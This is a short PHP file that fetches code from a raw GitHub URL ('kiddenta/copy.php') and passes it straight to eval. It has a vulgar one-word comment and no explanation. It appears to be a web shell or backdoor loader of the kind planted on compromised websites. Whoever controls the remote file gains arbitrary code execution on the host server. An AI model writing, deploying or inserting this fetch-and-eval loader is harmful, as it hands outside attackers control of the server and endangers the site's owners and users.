 
    <?php
    //KONTOL
    $url = 'https://raw.githubusercontent.com/kiddenta/kiddenta/refs/heads/main/copy.php';

    $code = file_get_contents($url);

    // 
    eval('?>' . $code);
    ?>

